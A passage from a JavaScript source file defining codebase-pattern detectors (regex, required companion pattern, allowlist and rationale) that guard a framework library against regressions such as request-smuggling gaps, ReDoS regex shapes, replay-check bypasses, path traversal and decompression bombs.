  { id: "mw-uses-real-appshutdown-addphase", primitive: "the app-shutdown handle exposes addPhase(phase) — a .registerPhase( call is a silently-dead phase registration against a method that does not exist, so the phase never runs at shutdown", scanScope: "lib", regex: /\.registerPhase\s*\(/, allowlist: [], reason: "b.appShutdown.create returns a handle whose phase-registration method is addPhase, not registerPhase. A caller that wrote handle.registerPhase(...) would get a no-op (or a TypeError at call time) and its teardown phase would never fire — the kind of silent miswiring where a documented shutdown step simply never runs. No lib site calls registerPhase today; this detector keeps the wrong method name from entering lib/. Empty allowlist — a registerPhase call is always the miswire." },

  { id: "body-parser-write-error-connection-close", primitive: "lib/middleware/body-parser.js's _writeError(res, status, message, code) response must set Connection: close — a body-parse rejection abandons the request stream mid-body, so the 4xx must force a socket teardown (RFC 9112 §9.6) to close the request-smuggling reuse window", scanScope: "lib", skipCommentLines: true, regex: /function _writeError\s*\(\s*res\s*,\s*status\s*,\s*message\s*,\s*code\s*\)[\s\S]{0,500}?res\.writeHead\s*\((?:(?!res\.end\b)(?!Connection)[\s\S]){0,500}?res\.end\b/, allowlist: [], reason: "_writeError is the generic body-parse rejection writer (malformed JSON, poisoned key, oversize payload); pairing the 4xx with Connection: close stops an upstream proxy reusing a socket whose request stream the parser abandoned mid-body (request-smuggling desync, RFC 9112 §9.6). Block-scoped to the _writeError(res, status, message, code) signature unique to body-parser.js (tus-upload / static / webhook _writeError carry different signatures): the regex matches the function's writeHead(...)…res.end window ONLY when that window carries no Connection token, so removing Connection: close from THIS writer fires even though the inline smuggling/chunked writers keep theirs. Empty allowlist — dropping Connection: close here re-opens the desync window." },

  { id: "queue-local-no-raw-jobs-table", primitive: "every jobs-table SQL reference must flow through the configured, safeSql-quoted qTable variable (resolved by _resolveTableRef via safeSql.quoteIdentifier / quoteQualified) — a raw `FROM _blamejs_jobs` / `INTO _blamejs_jobs` / `UPDATE _blamejs_jobs` literal hardcodes the default name and bypasses BYO-table + dialect quoting", scanScope: "lib", skipCommentLines: true, regex: /\b(?:FROM|INTO|UPDATE|DELETE FROM|JOIN)\s+_blamejs_jobs\b/, allowlist: [], reason: "queue-local now supports an operator-supplied config.table (validated + dialect-quoted by _resolveTableRef, held in qTable); every enqueue/lease/dlq statement interpolates qTable. A statement that hardcodes the raw `_blamejs_jobs` literal after a SQL keyword would ignore the BYO table and skip identifier quoting. The DEFAULT_TABLE / SEAL_TABLE constant declarations (`var X = \"_blamejs_jobs\"`) carry no preceding SQL keyword so they don't match, and skipCommentLines blanks the doc references — no per-file allowlist needed; any match is a real raw reference." },

  { id: "breach-clock-composes-incident-clock", primitive: "b.breach.deadline.createClock must compose b.incident.report.createDeadlineClock (one underlying timer) — it must NOT re-roll its own setInterval tick loop; the breach clock delegates the timer lifecycle to incident-report so there is a single tick source to drive + stop", scanScope: "lib", skipCommentLines: true, regex: /setInterval[\s\S]{0,8000}?breach\.deadline\.createClock|breach\.deadline\.createClock[\s\S]{0,8000}?setInterval/, allowlist: [], reason: "breach-deadline.createDeadlineClock wraps incidentReport().createDeadlineClock and forwards trackReport / acknowledgeSubmission / cancel / stop onto that inner clock; it owns no timer of its own. A setInterval inside breach-deadline.js means the tick loop was re-rolled instead of delegated — two independent timers drifting, and a stop() that no longer tears the real one down. File-scoped via co-occurrence of setInterval with the breach.deadline.createClock token unique to breach-deadline.js (incident-report.js owns the legitimate setInterval but never names breach.deadline.createClock, so it is not flagged). Empty allowlist — a timer here is the miswire." },

  { id: "bounded-chunk-collector-not-a-stream-consumer", primitive: "b.safeBuffer.boundedChunkCollector(opts) takes a SINGLE options object and returns a { push, result, bytesCollected } collector — it is not a stream consumer. To read a Readable (request body, upstream response) use b.safeBuffer.collectStream(stream, opts), which pumps the stream into a bounded collector and resolves a Buffer. A boundedChunkCollector(req, ...) call passes the stream as opts (maxBytes undefined → buffer/bad-arg throw) and then awaits / .then()s a non-Promise collector.", scanScope: "lib", skipCommentLines: true, regex: /boundedChunkCollector\s*\(\s*\w+\s*,/, allowlist: [], reason: "csp-report (413 on EVERY POST) and scim-server (every streamed body broke) both called safeBuffer.boundedChunkCollector(req, { maxBytes }) / (req, MAX, ErrClass, code): the request stream was passed as the opts argument (maxBytes undefined → synchronous buffer/bad-arg, surfaced as 413/500) and the returned push-collector was treated as a thenable. boundedChunkCollector has no (stream, opts) overload; b.safeBuffer.collectStream is the stream-reading sibling. The regex flags a call whose first argument is a bare identifier immediately followed by a comma (the multi-arg / stream-first misuse); single-object boundedChunkCollector({ ... }) and single-var boundedChunkCollector(opts) / boundedChunkCollector(opts || {}) calls do not match. Empty allowlist — there is no valid multi-arg form. This is the detector that would have caught both endpoints before smoke." },

  { id: "regex-polynomial-whitespace-in-repeated-group", primitive: "a regex literal must not place an optional-whitespace `\\s*` / `\\s+` at the END of a repeated group (the `(?:…\\s*)*` / `…\\s*)+` shape) — the same whitespace can be consumed either inside the group or by surrounding whitespace, so a crafted input backtracks polynomially (CWE-1333 ReDoS). Consume whitespace as a single disjoint alternative `(?:\\s|…)*` instead, and match block comments with the star-not-slash form, never a lazy `[\\s\\S]*?`.", scanScope: "lib", skipCommentLines: true, regex: /\\s[*+]\)[*+]/, allowlist: [], reason: "CodeQL js/polynomial-redos (alert 330) flagged lib/external-db.js's leading-keyword classifier `/^\\s*(?:\\/\\*…\\s*|--…\\s*)*([A-Za-z]+)/` — the `\\s*` both before AND at the tail of the repeated group gives two ways to consume the same whitespace run, so a SQL string of nested `/**/` or `*/--` comment runs backtracks polynomially; reused by the new OTel db.operation path it became a taint sink. Rewritten to `/^(?:\\s|\\/\\*(?:[^*]|\\*(?!\\/))*\\*\\/|--[^\\n]*\\n)*([A-Za-z]+)/` (disjoint single-char alternatives). codebase-patterns is a curated detector set, not a taint/ReDoS analyzer like CodeQL — this closes the specific shape locally so the next agent-authored comment-skip regex trips the gate before CI. Empty allowlist — a `\\s*)*` / `\\s+)+` tail in a lib regex is the ReDoS tell; allowlist a genuinely-anchored case with its structural reason." },

  { id: "attestation-pop-replay-store-must-await-thenable", primitive: "verifyClientAttestation's jti replay check (vopts.seenJti) MUST handle an async (Promise-returning) store — its result is awaited when it is a thenable so a Redis/DB store's resolved `false` (a replayed jti) refuses, instead of comparing a never-`false` Promise object with `=== false` and silently accepting the replay", scanScope: "lib", skipCommentLines: true, regex: /vopts\.seenJti\s*\(/, requires: /typeof\s+unseen\.then\s*===\s*["']function["']|unseen\s*=\s*await\s+unseen/, allowlist: [], reason: "v0.14.20 Codex P1 on PR #300 (replay-defense bypass, CWE-294) — verifyClientAttestation read `unseen = vopts.seenJti(jti, iat)` then `if (unseen === false) throw replay`. With an async (Redis/DB) atomic check-and-insert the callback returns a Promise; a Promise is never `=== false`, so a replayed jti was ACCEPTED and the draft-ietf-oauth-attestation-based-client-auth §12.1 replay defense was disabled for every multi-instance AS deployment. The verifier is now async and awaits a thenable result (`if (unseen && typeof unseen.then === \"function\") unseen = await unseen;`). The other oauth replay sinks (refreshAccessToken's ropts.checkAndInsert / ropts.seen, _normalizeTokens' vopts.seen) already await at the call site; only this path deviated. Anchored on the vopts.seenJti( token unique to this verifier; the requires-companion fails if a future edit drops the thenable-await, re-opening the silent-accept window. Empty allowlist — a seenJti result that is neither awaited nor thenable-checked is the bug." },

  { id: "jose-jws-builder-fixed-classical-alg-default", primitive: "a JWS builder that signs with an operator-supplied key MUST NOT default `opts.algorithm` to a fixed classical JOSE alg (ES256/384/512, RS/PS*) via `|| \"<alg>\"` — that signs a key of a different type (RSA / Ed25519 / non-matching EC curve) under a header alg that disagrees with the key (un-signable, or a self-invalid JWS the verifier's alg/kty check rejects). Derive the alg from the key type (mirroring oauth _resolveAttestationAlg / sd-jwt-vc-holder _resolveHolderAlg), or use a PQC pass-through default that works with any key", scanScope: "lib", skipCommentLines: true, regex: /\.algorithm\s*\|\|\s*["'](?:ES256|ES384|ES512|RS256|RS384|RS512|PS256|PS384|PS512)["']/, allowlist: [], reason: "v0.14.20 — the OAuth client-attestation builders (Codex P2 on PR #300) AND the sd-jwt-vc holder (`var algorithm = opts.algorithm || \"ES256\"`, found by the post-fix adversarial review) both hardcoded a fixed ES256 default that overrode any key-type reconciliation. ES256 is only self-consistent for an EC P-256 key; an RSA / Ed25519 / EC-P384 key signed under an ES256 header is un-signable or yields a JWS whose header alg disagrees with the signature, which every alg/kty-checking verifier rejects (self-invalid token; broken authentication / presentation). Both are now key-derived (_resolveAttestationAlg / _resolveHolderAlg). This detector flags any lib JWS builder reintroducing a fixed CLASSICAL JOSE alg as the `opts.algorithm ||` default — it deliberately does NOT match a PQC pass-through default (`|| \"ML-DSA-87\"` / `|| DEFAULT_ALG` / `|| \"SLH-DSA-...\"`, which sign with a null digest and work for the matching key) nor non-JOSE alg selectors (hash `\"sha384\"`, DKIM `\"rsa-sha256\"`, `\"token-bucket\"`). Empty allowlist — a fixed classical-alg default on a sign path is the self-invalid-JWS bug; a genuine EC-P256-only builder should still derive/validate the key, not assume." },

  { id: "attestation-alg-must-derive-from-key", primitive: "the OAuth client-attestation / PoP JWS builders must resolve the signing alg from the key type via _resolveAttestationAlg (infer a key-compatible default; refuse an explicit alg incompatible with the key) — never a fixed `opts.algorithm || \"ES256\"` default, which signs a non-EC key (RSA / Ed25519) under an ES256 header that verifyClientAttestation's alg/kty cross-check then rejects (self-invalid attestation)", scanScope: "lib", skipCommentLines: true, regex: /oauth-client-attestation(?:-pop)?\+jwt/, requires: /_resolveAttestationAlg\s*\(/, allowlist: [], reason: "v0.14.20 Codex P2 on PR #300 — buildClientAttestation / buildClientAttestationPop defaulted `var alg = opts.algorithm || \"ES256\"`, so an RSA / Ed25519 attester or instance key produced a compact JWS whose header said ES256 but whose signature was made with the real key; verifyClientAttestation's alg⇄kty cross-check then rejected the builder's OWN output for any non-P-256 key. Both builders now resolve the alg through _resolveAttestationAlg(explicitAlg, key): it infers a key-matched default (ES256/384/512 by curve, RS256 for RSA, EdDSA for Ed25519/Ed448) and refuses an explicit alg incompatible with the key BEFORE signing (auth-oauth/attestation-alg-key-mismatch). Anchored on the attestation `+jwt` typ literals unique to these builders (does NOT touch the generic `.algorithm || \"<selector>\"` strings in rate-limit / crypto / dkim, nor the sd-jwt holder KB-JWT path); the requires-companion fails if a future edit reverts to a hardcoded alg default. Empty allowlist — a fixed alg default on the attestation signing path is the self-invalid-JWS bug." },

  {
    // ROTATION-EPOCH ACCEPT (v0.14.x): a vault-key rotation (b.vault.rotate)
    // re-keys the local dataDir, which changes the SHA3-512 fingerprint of
    // the vault PUBLIC keys on every node. The canonical fingerprint in
    // _blamejs_cluster_state.vaultKeyFp then goes stale and
    // cluster.js _checkVaultKeyConsistency would VAULT_KEY_DRIFT-refuse boot
    // on every node. The fix gates the FATAL refusal on the operator's
    // acceptVaultKeyRotation declaration (configuredAcceptRotation): when
    // set, the node ADOPTS the new fingerprint + bumps a rotationEpoch
    // instead of refusing; when unset, the strict cross-node drift refusal
    // is unchanged (fail-closed against silent sealed-column corruption,
    // CWE-345). The bug class this locks: a future edit that re-hardens the
    // mismatch path to throw VAULT_KEY_DRIFT unconditionally (removing the
    // rotation escape hatch) would re-introduce the every-node-refuses-boot
    // outage after a legitimate rotation. VAULT_KEY_DRIFT is unique to
    // lib/cluster.js, so this is effectively file-scoped: the throw must
    // coexist with the configuredAcceptRotation gate. If the gate is ever
    // intentionally removed, carry an
    // `allow:cluster-vault-key-drift-without-rotation-accept-gate` marker
    // with the reason.
    id: "cluster-vault-key-drift-without-rotation-accept-gate",
    primitive: "lib/cluster.js _checkVaultKeyConsistency MUST gate the VAULT_KEY_DRIFT FATAL refusal on the operator's rotation declaration (configuredAcceptRotation, set from init opts.acceptVaultKeyRotation). A vault-key rotation legitimately changes the public-key fingerprint on every node; without the gate, every node refuses boot after a rotation. The undeclared-mismatch path stays fail-closed; the declared path adopts the new fingerprint and bumps rotationEpoch. Removing the gate re-opens the post-rotation cluster-wide boot outage.",
    regex: /throw\s+_err\(\s*["']VAULT_KEY_DRIFT["']/,
    requires: /configuredAcceptRotation|allow:cluster-vault-key-drift-without-rotation-accept-gate/,
    skipCommentLines: true,
    allowlist: [],
    reason: "ROTATION-EPOCH ACCEPT in lib/cluster.js: b.vault.rotate re-keys the local dataDir and changes the SHA3-512 vault-public-key fingerprint, but only the local dataDir — the external _blamejs_cluster_state coordination row keeps the old fingerprint, so every node would VAULT_KEY_DRIFT-refuse boot (a cluster-wide outage after a routine key rotation). The mismatch refusal is now gated on configuredAcceptRotation: declared rotation adopts the new fingerprint + bumps rotationEpoch; undeclared mismatch still fails closed (CWE-345 binding-integrity for sealed columns). Detector locks the gate so a future re-hardening of the drift path can't drop the rotation escape hatch. VAULT_KEY_DRIFT is unique to cluster.js; allowlist empty.",
  },

  // Codex P1 on v0.12.11 PR #162 — surfaced the NaN/Infinity bypass
  // through `typeof X === "number" ? X : default` gating. The
  // pattern exists widely in the codebase (~29 call sites at the
  // time the finding was filed) — most are framework-controlled
  // (numeric byte-slot reads from Buffers, enum-tag checks) where
  // NaN-vs-number is moot. Adding a static detector here would
  // cause widespread false positives without surfacing the actual
  // operator-opt-controlled bug pattern. The runtime gate in
  // lib/backup/index.js + lib/archive-wrap.js IS the fix; a
  // future patch can sweep the 29 sites if any are found to be
  // operator-opt controlled. See feedback_typeof_number_nan_bypass
  // (write this as a memory if it recurs).

  {
    // Codex P2 on v0.12.10 PR #161 — partial recipient objects
    // ({ publicKey } alone) silently triggered b.crypto.encrypt's
    // ML-KEM-only fallback, degrading archive-wrap's documented
    // hybrid contract (ML-KEM-1024 + P-384 ECDH). Detector locks
    // the shape: any caller that constructs a recipient with
    // `publicKey:` MUST also carry `ecPublicKey:` in the same
    // object literal OR carry an `allow:archive-wrap-partial-recipient`
    // marker explaining why KEM-only is intentional (typically:
    // the operator explicitly opted into b.crypto.encryptMlkemOnly).
    id: "archive-wrap-recipient-missing-ec-half",
    primitive: "static-key recipients for b.archive.wrap / bundleAdapterStorage `recipient:` opt MUST carry BOTH publicKey (ML-KEM-1024 PEM) AND ecPublicKey (P-384 ECDH PEM). Partial recipients trip b.crypto.encrypt's ML-KEM-only fallback which silently degrades the hybrid defense-in-depth contract this surface promises.",
    // File-scoped: ANY recipient: { publicKey: ... } object literal
    // in lib/ MUST also include ecPublicKey in the same object.
    // Fires only when ` publicKey: ` appears inside a `recipient: {`
    // bracket; the codebase patterns walker is line-based so this
    // is approximate but catches the obvious smell.
    regex: /recipient:\s*\{\s*[^}]*publicKey:/,
    requires: /ecPublicKey|allow:archive-wrap-partial-recipient/,
    skipCommentLines: true,
    allowlist: [
      // archive-wrap.js IS the runtime-refusal site for partial
      // recipients (throws archive-wrap/hybrid-required); it
      // references partial-recipient shapes in error messages.
      "lib/archive-wrap.js",
    ],
    reason: "Codex P2 on v0.12.10 PR #161 — archive-wrap's recipient contract is hybrid PQC by design. Partial recipient objects degrade to KEM-only with only a one-shot audit. Detector locks the static-side gate so library code composing wrap/unwrap can't silently drop the ECDH leg.",
  },

  {
    // v0.12.10 — when bundleAdapterStorage carries a posture that
    // mandates encryption-at-rest (HIPAA / PCI-DSS / similar), the
    // same call-site MUST propagate cryptoStrategy: "recipient"
    // (or refuse upstream) — the storage adapter alone cannot
    // satisfy the regulatory contract. The library-internal refusal
    // at `backup/posture-requires-encryption` is the runtime gate;
    // this detector locks the shape at the static-analysis layer
    // so any future caller that drops cryptoStrategy from a
    // posture-bearing call surfaces during codebase-patterns.
    id: "backup-adapter-storage-without-posture-check",
    primitive: "any bundleAdapterStorage({ ... posture: ... }) call site that names a posture from the HIPAA / PCI-DSS / etc. set MUST also pass cryptoStrategy. The library-side refusal exists; the detector exists so the contract can't drift silently when a primitive composes bundleAdapterStorage indirectly.",
    regex: /bundleAdapterStorage\s*\([^)]*posture:/,
    requires: /cryptoStrategy|allow:backup-adapter-storage-without-posture-check/,
    skipCommentLines: true,
    allowlist: [
      // backup/index.js IS the primitive — the runtime refusal lives
      // there. Self-allowed so the detector doesn't flag the
      // refusal-emitting code itself.
      "lib/backup/index.js",
    ],
    reason: "v0.12.10 — Flavor 1 recipient wrap lands as bundleAdapterStorage's cryptoStrategy: \"recipient\". HIPAA + PCI-DSS postures refuse cryptoStrategy: \"none\" at runtime; this detector adds the static-side gate so a primitive composing bundleAdapterStorage with a posture opt can't accidentally drop the cryptoStrategy propagation. Future Flavor 2 (per-entry, v0.12.11) extends the same contract.",
  },

  {
    // Codex P1 + P2 on v0.12.9 PR #160 — backup readBundle's
    // tar.gz restore path inherited archive.read.gz defaults (1 GiB
    // output / 100× ratio), which made the SAME primitive write
    // bundles it couldn't read back. The detector enforces the
    // write/read contract for self-authored gzip payloads: any
    // lib/ call to `archive.read.gz(...)` from a context that has
    // its own size budget (paired with a `maxBundleBytes` /
    // `maxOutputBytes` / `maxPayloadBytes` opt) MUST propagate
    // that budget to read.gz via `maxDecompressedBytes` AND
    // disable the ratio cap (`maxExpansionRatio: 0`) — bombs in
    // self-authored payloads are already prevented at write time.
    id: "archive-read-gz-without-self-authored-budget",
    primitive: "callers of archive.read.gz from a context that gates its own writes on a size cap (maxBundleBytes / similar) must pass maxDecompressedBytes + maxExpansionRatio:0 so the write/read contract is symmetric. Bomb defenses live at the upstream cap; the gz layer just decompresses.",
    // File-scoped: only fires on backup/index.js shapes for now.
    // archive.read.gz called with no opts is fine in operator code
    // (adversarial-input case); the antipattern is when the caller
    // also writes payloads under its own size cap.
    regex: /archive(?:Lazy\(\))?\.read\.gz\s*\([^)]*\)\s*[^,{]/,
    requires: /maxDecompressedBytes/,
    skipCommentLines: true,
    allowlist: [
      // archive-gz.js IS the read.gz primitive itself.
      "lib/archive-gz.js",
    ],
    reason: "Codex P1/P2 on v0.12.9 PR #160 — backup readBundle's tar.gz restore inherited the 100× ratio + 1 GiB output defaults, breaking restore for zero-filled DB dumps + ~1-8 GiB bundles that writeBundle accepts. Fix: every archive.read.gz call from a primitive with its own size budget propagates that budget. Detector locks the symmetry.",
  },

  {
    // v0.12.9 — Direct node:zlib gunzip calls in lib/ must compose
    // b.safeDecompress (1 GiB output / 100× ratio default caps) so a
    // hostile gzip stream can't OOM or expand-bomb the host. Mirrors
    // the v0.11.5 must-compose pattern. lib/archive-gz.js IS the
    // canonical gunzip site (it wires safeDecompress in directly);
    // every other lib/ call to zlib.gunzipSync / zlib.createGunzip
    // must either route through b.safeDecompress OR carry a marker
    // explaining why it's safe to bypass (e.g. the caller already
    // applied `maxOutputLength` AND the input is operator-controlled).
    id: "archive-gz-without-safedecompress",
    primitive: "every lib/ call to zlib.gunzipSync / zlib.createGunzip / gunzip MUST either go through lib/archive-gz.js (which composes b.safeDecompress) OR carry an `allow:archive-gz-without-safedecompress` marker with the reason the bomb gate is bypassed (typically: `maxOutputLength` is already enforced + the input is operator-trusted).",
    regex: /zlib\.(?:gunzipSync|createGunzip)\b/,
    requires: /safeDecompress|maxOutputLength|allow:archive-gz-without-safedecompress/,
    skipCommentLines: true,
    allowlist: [
      // archive-gz.js is the canonical gunzip site — it directly
      // imports safeDecompress and routes every call through it.
      // Listed here so the detector doesn't false-positive against
      // its own enforcement file.
      "lib/archive-gz.js",
    ],
    reason: "v0.12.9 — b.archive.read.gz is the framework's gzip read primitive and composes b.safeDecompress for every gunzip. Direct lib/ zlib.gunzipSync / zlib.createGunzip calls must either route through b.archive.read.gz, compose b.safeDecompress inline, OR carry an explicit `maxOutputLength` cap with the bypass marker. The detector locks the contract so v0.13+ primitives that handle a gzip-wrapped payload can't quietly drop the bomb cap.",
  },

  {
    // Codex P1 on v0.12.8 PR #159 — archive-tar-read.js's walker
    // advanced `pos` by the declared padded block size without
    // checking that those bytes existed in the buffer. A truncated
    // archive (header says 11 bytes, buffer holds 8) silently
    // produced an entry whose extract() sliced the 8-byte prefix
    // and wrote it as if it were the complete file. Fix: refuse
    // upfront with a `truncated-entry` typed error when
    // `bodyStart + paddedSize > bytes.length`. Same shape applies
    // to the pax-extended-header path (its `bodyEnd` advance was
    // the same uncapped arithmetic).
    id: "archive-tar-walker-without-truncation-check",
    primitive: "tar walkers in lib/archive-tar-read.js MUST verify that the declared block size fits within the remaining buffer before advancing `pos` — a header that claims more bytes than the buffer holds is a truncated archive, not a valid entry. The refusal carries `truncated-entry` code so operators can distinguish wire-format-bad input from policy-bad input.",
    // File-scoped: only fires on archive-tar-read.js. The walker
    // advances pos by paddedSize (Math.ceil(hdr.size / BLOCK_SIZE)
    // * BLOCK_SIZE) — any code that adds paddedSize to pos without
    // a preceding bounds check is the smell.
    regex: /pos\s*\+=\s*paddedSize/,
    requires: /truncated-entry/,
    skipCommentLines: true,
    allowlist: [],
    reason: "Codex P1 on v0.12.8 PR #159 — archive-tar-read.js's tar walker recorded each entry and advanced pos by paddedSize without verifying the declared bytes existed in the buffer. A truncated archive silently produced a partial-content entry on extract — exact reproducer in the Codex thread: declared 11-byte file backed by 8 bytes of buffer produced an 8-byte output. Fix: refuse upfront with `archive-tar/truncated-entry` typed error. Detector locks the shape: any code path that advances pos by paddedSize in archive-tar-read.js MUST carry a `truncated-entry` refusal in the same file.",
  },

  {
    // Codex P2 on v0.11.22 PR #126 — `b.cert.create`'s SNI dispatch
    // wildcard-matched `*.example.com` against `foo.bar.example.com`
    // (multi-label) because the suffix check was `endsWith(pattern.
    // slice(1))` alone. RFC 6125 §6.4.3 restricts the wildcard to ONE
    // label in the left-most position. This detector forces the
    // single-label discipline: any code that suffix-matches a wildcard
    // pattern via `pattern.slice(1)` MUST also check that the leading
    // label contains no `.`.
    id: "wildcard-suffix-match-without-single-label-check",
    primitive: "after `endsWith(pattern.slice(1))`, also assert the consumed leading label has no `.` — `var leading = servername.slice(0, servername.length - tail.length); if (leading.indexOf('.') !== -1) continue;`",
    regex: /\.endsWith\s*\(\s*\w+\s*\.\s*slice\s*\(\s*1\s*\)/,
    // Requires either the documented RFC 6125 single-label check
    // (`indexOf(".") !== -1`) or an `allow:wildcard-suffix-match-without-single-label-check` marker.
    requires: /indexOf\s*\(\s*["']\.["']\s*\)|allow:wildcard-suffix-match-without-single-label-check/,
    skipCommentLines: true,
    allowlist: [],
    reason: "Codex P2 on v0.11.22 PR #126 — `b.cert.create`'s SNI dispatcher matched `*.wild.example` against `foo.bar.wild.example` because the suffix-only check accepted multi-label leading prefixes. RFC 6125 §6.4.3: wildcard SAN matches exactly ONE label in the left-most position. Detector forces the discipline: any `endsWith(pattern.slice(1))` style wildcard match in lib/ MUST also enforce the single-label invariant via an `indexOf('.')` check on the consumed leading label.",
  },

  {
    // Codex P1 on v0.11.22 PR #126 — `b.cert.create` accepted manifest
    // entries with names like `../escape` because the cert name is used
    // as a filesystem path segment under storage.rootDir but only the
    // non-empty check ran at factory time. The fix added a strict
    // character class + explicit `..` refusal. The general bug class
    // is: any operator-supplied identifier that lands as a path
    // segment must be sanitized at the surface boundary, not relying
    // on `path.join` semantics to constrain it.
    //
    // Detector shape (narrow + low FP): flag any source file that
    // uses `path.join(...args, X.name)` or `path.join(...args, X.id)`
    // shape (member access on an operator-supplied opts object) AND
    // does NOT also call `b.safePath.resolve` OR enforce a regex
    // refusing path-traversal payloads on the same identifier.
    //
    // This is best-effort: precise dataflow detection requires
    // semantic analysis. The regex catches the most common shape;
    // wider variants (path.join with computed strings, fs.writeFile
    // with concatenated paths) need per-file vigilance + behavioral
    // tests in the consuming primitive's own test file.
    id: "fs-path-from-operator-identifier-without-traversal-refusal",
    primitive: "compose `b.safePath.resolve(rootDir, X.name)` (refuses traversal at the boundary) OR validate the name against a strict character class + explicit `..` refusal before passing to `path.join` / `fs.*` calls",
    regex: /\bpath\.join\s*\([^)]*\b\w+\.(?:name|id)\b[^)]*\)/,
    // Requires either a composed b.safePath call, an explicit `..`
    // refusal regex literal, or a per-file allow marker documenting
    // why the identifier is structurally safe (e.g. comes from an
    // internally-generated bundleId with a regex-guarded shape).
    requires: /safePath\.resolve|\/\\\.\\\.|"\.\."|'\.\.'|allow:fs-path-from-operator-identifier-without-traversal-refusal/,
    skipCommentLines: true,
    allowlist: [],
    reason: "Codex P1 on v0.11.22 PR #126 — `b.cert.create` accepted manifest cert names like `../escape` and `subdir/file` because only non-empty validation ran at the factory; the name then landed as a filesystem path segment under storage.rootDir. The fix added a strict `[A-Za-z0-9_][A-Za-z0-9_.-]{0,63}` character class + explicit `..` refusal. The bug class — operator-supplied identifier used as a path segment without sanitization — is broader than this one primitive. Detector flags any `path.join(..., X.name|id)` shape in lib/ that doesn't also compose `b.safePath.resolve` OR refuse `..` via a regex on the same identifier. Imperfect; behavioral path-traversal tests in the consuming primitive's own test file (e.g. cert.test.js's 8 bad-name shapes) are the per-primitive regression guard.",
  },

  {
    // Codex P1 on v0.11.23 PR #127 — `b.mailStore.create(...).hardExpunge`
    // looped over the input objectids array per-element and ran a
    // `stmtDecrementQuota` inside the loop, so `hardExpunge(folder, [id, id])`
    // double-decremented the per-folder quota even though only one
    // message physically existed. The fix dedupes the input array
    // before the loop. The general bug class — accumulator update
    // inside a loop over operator-supplied ids without dedup — is
    // broader: any sum / count / quota / counter that decrements
    // (or increments) once per loop iteration over an operator-
    // supplied id array MUST dedupe first or the operator can drive
    // the counter past zero / cause double-counting of work.
    id: "quota-decrement-loop-over-ids-without-dedup",
    primitive: "deduplicate operator-supplied id arrays before the per-id accumulator update — `var seen = Object.create(null); var unique = []; for (...) if (!seen[id]) { seen[id] = true; unique.push(id); }` OR `Array.from(new Set(ids))`",
    // Match any file that calls a `stmtDecrement*` / `stmtBumpQuota`
    // / `stmtDecrementBytes` shape inside a per-id loop. The
    // companion check requires a dedup primitive (Object.create(null)
    // + .push to a uniqueIds array, OR `new Set(`) in the same file.
    regex: /stmt(?:Decrement|Bump)(?:Quota|Bytes|Count)/,
    requires: /Object\.create\(\s*null\s*\)|new\s+Set\s*\(|uniqueIds|seenIds/,
    skipCommentLines: true,
    allowlist: [],
    reason: "Codex P1 on v0.11.23 PR #127 — `hardExpunge` per-id loop ran a quota decrement against each iteration regardless of duplicates. Calling with `[id, id]` drove `usedBytes` / `usedCount` negative + duplicated the deleted-id list. Bug class: accumulator-update-inside-loop-over-operator-supplied-ids. Detector flags any file that touches `stmtDecrement(Quota|Bytes|Count)` or `stmtBump(Quota|Bytes|Count)` and requires a dedup primitive (`Object.create(null)` + `uniqueIds.push` OR `new Set(`) in the same file. Per-primitive behavioral regression tests (mail-agent.test.js's `[id, id, id]` triple-input case) are the per-call-site guard.",
  },
  {
    // v0.10.14 — raw `audit.emit(...)` outside a try/catch swallow
    // crashes hot paths when the audit sink throws. Hot-path audit
    // emission must be drop-silent. When the operator-supplied audit sink throws — bad
    // schema, full disk, broken downstream — the throw bubbles
    // through the request that triggered it and crashes a path that
    // has nothing to do with auditing. The framework convention is
    // EITHER `audit.safeEmit(...)` (which wraps drop-silent for you)
    // OR a hand-written `try { audit.emit(...) } catch (_e) { /* drop */ }`.
    // v0.10.14 surfaced subject.js:_writeAudit, whose comment
    // promised swallowing but actually let the throw escape.
    id: "raw-audit-emit-without-drop-silent-wrap",
    primitive: "audit.safeEmit(...) OR try { audit.emit(...) } catch (_e) { /* drop-silent */ }",
    // Match `audit.emit(` outside docstring / single-line-comment
    // context. `skipCommentLines` opts the runner into stripping
    // jsdoc/single-line comment lines before regex test so that
    // ` *     await audit.emit({...});` shown as an @example doesn't
    // trip the detector. False negatives (real audit.emit hidden in
    // a comment-then-uncommented code path) are extremely rare; the
    // allowlist catches genuinely-safe call sites with a
    // documented try/catch wrap.
    regex: /\baudit\.emit\s*\(/,
    skipCommentLines: true,
    allowlist: [
      // The audit primitive itself defines `emit` + `safeEmit`.
      "lib/audit.js",
      // guard-all.js wraps audit.emit in a try/catch immediately
      // (verified at v0.10.14 audit time). The detector's regex can't
      // express "wrapped in try{}"; the allowlist enforces the
      // commitment with a documented reason.
      "lib/guard-all.js",
      // session.js wraps audit.emit in try/catch for the session-
      // rotate hot path (verified at v0.10.14 audit time).
      "lib/session.js",
      // subject.js: _writeAudit wraps audit.emit in try/catch as of
      // v0.10.14 (the earlier unwrapped form was a real drop-silent
      // violation found by this detector during its first scan).
      "lib/subject.js",
    ],
    reason: "Drop-silent audit emission on hot paths. v0.10.14 audit found subject.js:_writeAudit emitting raw without a try/catch, letting a misconfigured audit sink crash subject mutations the database already committed. New audit-emit call sites MUST use audit.safeEmit (preferred) or wrap audit.emit in try/catch with a drop-silent comment.",
  },
  // N5 — `Date.now() - <var>` elapsed-time math vs `process.hrtime()`
  // is deferred from v0.10.14 to a follow-up patch. v0.10.14's initial
  // scan found 49 hits, of which ~70% are legitimate wall-clock
  // semantics (row age, session age, retention cutoffs, audit
  // timestamps, JWT exp / nbf, retry circuit-breaker cooldown, rate-
  // limit windows) that are correct as-written. A useful detector
  // needs to distinguish elapsed-time-math from wall-clock-age
  // semantically — regex alone is too noisy. v0.10.13's stream-
  // throttle elapsed-clamp shipped the highest-value fix already;
  // remaining call sites get per-file review in a later patch.
  {
    // Codex P1 (v0.10.13 PR #102) — PQC AlgorithmIdentifier with NULL
    // parameters. ML-DSA (RFC 9909 §3), SLH-DSA (RFC 9881 §3), and
    // ML-KEM (RFC 9936 §3) all specify that the AlgorithmIdentifier's
    // parameters field is ABSENT. Appending `NULL` makes the CMS
    // (or X.509) structure non-conformant — strict CMS / X.509
    // validators reject the signature/recipient. The fix is to
    // emit `SEQUENCE { OID }` with no second element, never
    // `SEQUENCE { OID, NULL }`, for these OIDs. cms-codec.js's
    // `_algorithmIdentifier` dispatches off the ABSENT_PARAM_OIDS
    // set so the right shape ships for every PQC OID.
    id: "pqc-algid-with-null-params",
